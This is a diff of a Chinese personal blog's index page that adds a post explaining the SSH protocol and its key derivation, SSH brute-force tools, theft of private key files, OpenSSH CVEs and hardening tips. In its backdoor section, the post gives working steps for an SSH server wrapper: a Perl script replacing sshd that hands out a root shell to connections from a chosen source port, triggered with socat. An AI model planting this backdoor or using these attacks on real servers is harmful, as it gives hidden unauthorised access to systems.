@@ -270,6 +270,260 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://tengpapa.com/2018/07/01/Linux/SSH资料整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tengpapa">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://wx1.sinaimg.cn/small/4369aa0aly1fdmtcoiyoij20wt0wt7wh.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="芳华明天">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/01/Linux/SSH资料整理/" itemprop="url">
+                  SSH 详细解析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-01T18:12:38+08:00">
+                2018-07-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>[TOC]<br>;显示目录</p>
+<hr>
+<p>###0x01 SSH 简介</p>
+<p>&emsp;&emsp;SSH（Secure SHell）[^1]是一种网络协议，目前已经成为 Linux 系统的标准配置。SSH 的主要目的是用来取代传统的 telnet 和 R 系列命令（rlogin, rsh, rexec 等），实现对远程登录和远程执行命令的加密，防止由于网络监听而导致的密码泄露等问题。</p>
+<p>&emsp;&emsp;SSH 协议目前有两个版本：SSH1 和 SSH2，SSH2 的安全性远高于 SSH1。</p>
+<p>&emsp;&emsp;实现 SSH 协议的服务端软件主要有：OpenSSH 和 SSH Communications，前者为免费开源软件，为主流 SSH 软件，后者为商用软件。</p>
+<p>&emsp;&emsp;支持 SSH 协议的客户端软件则较多，常用主要有：Lunix 下的 ssh 命令、Putty、secureCRT、Xshell、Bitvise SSH Client 等。</p>
+<p>&emsp;&emsp;SSH 的登录方式主要有两种：1）用户名口令登录方式；2）基于密钥的登录方式。</p>
+<p>&emsp;&emsp;关于 SSH 协议的具体描述，可参考 RFC4250 ~ 4255。</p>
+<hr>
+<p>###0x02 SSH 协议解析</p>
+<h5 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h5><p>&emsp;&emsp;SSH 协议由三个主要部分组成：传输层协议、验证协议、连接协议。</p>
+<ul>
+<li><p>传输层协议：提供服务器验证、保密性和完整性，也可选的提供压缩。</p>
+</li>
+<li><p>验证协议：向服务器验证客户端用户，运行在传输层协议上。用户名口令验证及基于密钥的登录验证都在该层进行。</p>
+</li>
+<li><p>连接协议：将加密隧道复用为若干逻辑隧道，运行在验证协议上。</p>
+</li>
+</ul>
+<h5 id="2-2-密钥交换"><a href="#2-2-密钥交换" class="headerlink" title="2.2 密钥交换"></a>2.2 密钥交换</h5><h6 id="2-2-1-交换过程"><a href="#2-2-1-交换过程" class="headerlink" title="2.2.1 交换过程"></a>2.2.1 交换过程</h6><p>&emsp;&emsp;密钥交换产生两个值：一个共享秘密（shared secret）K，一个交换哈希（exchange hash）H。</p>
+<div align="center"><br><img src="http://wx2.sinaimg.cn/mw690/4369aa0aly1fsuj5pew04j20o30qn0ty.jpg" alt="ssh pro"><br></div>
+
+<p>&emsp;&emsp;其中，V_c 为 client 的版本字符串（不包含结尾的 CR 和 NL），V_s 为 server 的版本字符串（不包含结尾的 CR 和 NL），I_c 为 client 的 SSH_MSG_KEXINIT 消息的负载，I_s 为 server 的 SSH_MSG_KEXINIT 消息的负载。</p>
+<p>&emsp;&emsp;目前，仅定义了两个密钥交换方法：Diffie-Hellman group 1 SHA-1 和 Diffie-Hellman group exchange SHA-1 (DHGEX)，前者使用一个固定的群，后者协商使用的群参数。</p>
+<p>&emsp;&emsp;第一次密钥交换的交换哈希 H 被用作会话标识（session ID），它是对该连接的唯一标识。会话标识被计算出来以后，即使后来重新交换了密钥，也不再改变。</p>
+<h6 id="2-2-2-密钥计算方法"><a href="#2-2-2-密钥计算方法" class="headerlink" title="2.2.2 密钥计算方法"></a>2.2.2 密钥计算方法</h6><table>
+<thead>
+<tr>
+<th>密钥类型</th>
+<th>计算方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>client 到 server 的初始 IV（CBC 等）</td>
+<td>h(K &#124;&#124; H &#124;&#124; “A”  &#124;&#124; SID)</td>
+</tr>
+<tr>
+<td>server 到 client 的初始 IV</td>
+<td>h(K &#124;&#124; H &#124;&#124; “B”  &#124;&#124; SID)</td>
+</tr>
+<tr>
+<td>client 到 server 的加密秘钥（对称秘钥）</td>
+<td>h(K &#124;&#124; H &#124;&#124; “C”  &#124;&#124; SID)</td>
+</tr>
+<tr>
+<td>server 到 client 的加密秘钥</td>
+<td>h(K &#124;&#124; H &#124;&#124; “D”  &#124;&#124; SID)</td>
+</tr>
+<tr>
+<td>client 到 server 的完整性秘钥（HMAC）</td>
+<td>h(K &#124;&#124; H &#124;&#124; “E”  &#124;&#124; SID)</td>
+</tr>
+<tr>
+<td>server 到 client 的完整性秘钥</td>
+<td>h(K &#124;&#124; H &#124;&#124; “F”  &#124;&#124; SID)</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">K = shared secret,  H = exchange hash,  SID = session ID</div></pre></td></tr></table></figure>
+<p>&emsp;&emsp;密钥数据必须从哈希输出的开头开始取。即从哈希值的开头，取所需数量的字节。如果需要的密钥长度超过 HASH 输出，则拼接 K、H 和当前的整个密钥并计算其 HASH，然后将 HASH 产生的字节附加到密钥尾部。重复该过程，知道获得足够的密钥材料。</p>
+<p>&emsp;&emsp;以 client 到 server 的加密秘钥为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key1 = h(K||H||&quot;C&quot;||SID)</div><div class="line">key2 = h(K||H||key1)</div><div class="line">key3 = h(K||H||key1||key2)</div><div class="line">. . .</div><div class="line">key  = key1||key2||key3|| . . .</div></pre></td></tr></table></figure>
+<hr>
+<p>###0x03 SSH 的攻击方法</p>
+<h5 id="3-1-暴力破解-SSH-密码"><a href="#3-1-暴力破解-SSH-密码" class="headerlink" title="3.1 暴力破解 SSH 密码"></a>3.1 暴力破解 SSH 密码</h5><ol>
+<li><p><strong>hydra：</strong>        Kali 下分有界面和无界面的。</p>
+</li>
+<li><p><strong>Medusa：</strong>        kali 下命令行工具，最新版本 2.2，2015 年后未再更新。</p>
+</li>
+<li><p><strong>patator：</strong>    Kali 下的命令行工具，基于 python，有很多模块。</p>
+</li>
+<li><p><strong>Metasploit：</strong>    “msfconsole” -&gt; “search ssh”，获取有关 ssh 的所有模块，最新模块是 2017 年 8 月 10 日的 CVE-2017-1000117（Git、SVN、Mercurial 三款主流原版本控制系统，攻击者向受害者发送精心构造的 ssh://URL 链接，访问会导致恶意指令在客户端执行）。</p>
+</li>
+</ol>
+<h5 id="3-2-针对密钥登录方式的攻击"><a href="#3-2-针对密钥登录方式的攻击" class="headerlink" title="3.2 针对密钥登录方式的攻击"></a>3.2 针对密钥登录方式的攻击</h5><p>&emsp;&emsp;拷贝被控机器的私钥和公钥文件（id_rsa 和 id_rsa.pub，通常位于用户根目录下的 .ssh 文件夹内），可进行远程的免用户口令登录。注意：需要两个文件一起拷贝，仅拷贝私钥文件不行（亲测）。</p>
+<h5 id="3-3-针对-SSH-协议的攻击"><a href="#3-3-针对-SSH-协议的攻击" class="headerlink" title="3.3 针对 SSH 协议的攻击"></a>3.3 针对 SSH 协议的攻击</h5><p>&emsp;&emsp;通过特殊方法获取服务端或客户端的随机数，即 DH 密钥交换时的 x 或 y。通常有</p>
+<p>&emsp;&emsp;方法一：分析 ssh 实现软件，寻找随机数生成的脆弱点。</p>
+<p>&emsp;&emsp;方法二：控制机器，按要求生成随机数。</p>
+<hr>
+<p>###0x04 SSH 后门</p>
+<h5 id="4-1-SSH-Server-Wrapper-后门"><a href="#4-1-SSH-Server-Wrapper-后门" class="headerlink" title="4.1 SSH Server Wrapper 后门"></a>4.1 SSH Server Wrapper 后门</h5><p>（1）复制 sshd 到 bin 目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /usr/sbin</div><div class="line">mv sshd ../bin</div></pre></td></tr></table></figure></p>
+<p>（2）编辑 sshd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vi sshd //加入以下内容并保存</div><div class="line">#!/usr/bin/perl</div><div class="line">exec&quot;/bin/sh&quot;if(getpeername(STDIN)=~/^..LF/);</div><div class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</div></pre></td></tr></table></figure></p>
+<p>（3）修改权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 755 sshd</div></pre></td></tr></table></figure></p>
+<p>（4）使用 socat<br>&emsp;&emsp;socat 号称 Linux 下的瑞士军刀，可以实现连接远程端口、远程传递 shell、端口转发等功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat STDIO TCP4:target_ip:22,sourceport=19526</div></pre></td></tr></table></figure></p>
+<p>（5）使用 ssh root@ target_ip 即可免密码登录</p>
+<h5 id="4-2-SSH-公钥免密"><a href="#4-2-SSH-公钥免密" class="headerlink" title="4.2 SSH 公钥免密"></a>4.2 SSH 公钥免密</h5><p>&emsp;&emsp;将本地计算机生成公私钥，将公钥文件复制到服务器上，即可实现免密码登录服务器。</p>
+<hr>
+<p>###0x05 SSH 攻击防护</p>
+<ol>
+<li><p>修改掉默认的 22 端口。</p>
+</li>
+<li><p>禁止 root 用户的 ssh 登录。（使用中一般用普通用户登录，当需要 root 权限时，再切换到 root 用户下）</p>
+</li>
+<li><p>设置登录 IP 白名单。</p>
+</li>
+<li><p>采用密钥登录的方式。</p>
+</li>
+<li><p>使用 snort、ossec 等开源的入侵检测系统保护服务器。</p>
+</li>
+</ol>
+<hr>
+<p>###0x06 OpenSSH 的近期漏洞</p>
+<ol>
+<li><p>CVE-2016-10009<br>漏洞级别： 中危漏洞<br>适用版本： OpenSSH 版本 &lt; 7.4<br>说　　明： 这个漏洞的利用条件比较苛刻，要求攻击者控制转发 agent-socket，并且需要有被控主机的文件系统写权限。</p>
+</li>
+<li><p>CVE-2016-10010<br>适用版本： OpenSSH 版本 &lt; 7.4<br>漏洞类型： 特权提升漏洞<br>说　　明： <a href="https://www.exploit-db.com" target="_blank" rel="external">https://www.exploit-db.com</a> 上有利用代码。</p>
+</li>
+</ol>
+<hr>
+<p>[^1]: 具体协议可参考 RFC4250 ~ 4255</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://tengpapa.com/2018/04/02/Windows编程/svchost/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1203,7 +1457,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://tengpapa.com/2017/09/06/Ubuntu/安装_Sublime_Text_3/">
+    <link itemprop="mainEntityOfPage" href="http://tengpapa.com/2017/09/06/Linux/安装_Sublime_Text_3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="tengpapa">
@@ -1225,7 +1479,7 @@
             
               
                 
-                <a class="post-title-link" href="/2017/09/06/Ubuntu/安装_Sublime_Text_3/" itemprop="url">
+                <a class="post-title-link" href="/2017/09/06/Linux/安装_Sublime_Text_3/" itemprop="url">
                   Ubuntu 16.04 安装及配置 Sublime Text 3
                 </a>
               
@@ -1672,162 +1926,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://tengpapa.com/2017/03/25/围棋/葛老师围棋课堂（170325）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="tengpapa">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://wx1.sinaimg.cn/small/4369aa0aly1fdmtcoiyoij20wt0wt7wh.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="芳华明天">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/03/25/围棋/葛老师围棋课堂（170325）/" itemprop="url">
-                  葛老师围棋课堂（170325）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-25T22:09:30+08:00">
-                2017-03-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/围棋/" itemprop="url" rel="index">
-                    <span itemprop="name">围棋</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="一-课堂内容"><a href="#一-课堂内容" class="headerlink" title="一. 课堂内容"></a>一. 课堂内容</h3><ol>
-<li>讲解小朋友的作业，开局 30 步棋。</li>
-<li>讲解布局基础：金角银边草肚皮，定式占大场。</li>
-<li>讲了一道习题，钓鱼走法。</li>
-</ol>
-<h3 id="二-第一盘布局"><a href="#二-第一盘布局" class="headerlink" title="二. 第一盘布局"></a>二. 第一盘布局</h3><p>葛老师指出，第一盘布局很珍贵，体现了对于围棋的最初的理解，随着水平的提高，会越来越喜欢自己的第一盘棋!</p>
-<div align="center"><br><img src="http://wx1.sinaimg.cn/mw690/4369aa0aly1fe4mdhswowj20rs0teqgr.jpg" alt="bu-1" title="第一盘布局"><br></div>
-
-<h3 id="三-钓鱼吃法"><a href="#三-钓鱼吃法" class="headerlink" title="三. 钓鱼吃法"></a>三. 钓鱼吃法</h3><p><strong>题目：</strong>黑吃白子</p>
-<div align="center"><br><img src="http://wx3.sinaimg.cn/mw690/4369aa0aly1fe4mn9m1w1j205k04aq3e.jpg" alt="diao-1"><br></div>
-
-<p><strong>答案：</strong>黑子往白子的虎口中送一饵</p>
-<div align="center"><br><img src="http://wx1.sinaimg.cn/mw690/4369aa0aly1fe4mna7r5ej20r40t015m.jpg" alt="diao-1"><br></div>
-
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1877,7 +1975,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1888,7 +1986,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1899,7 +1997,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">26</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
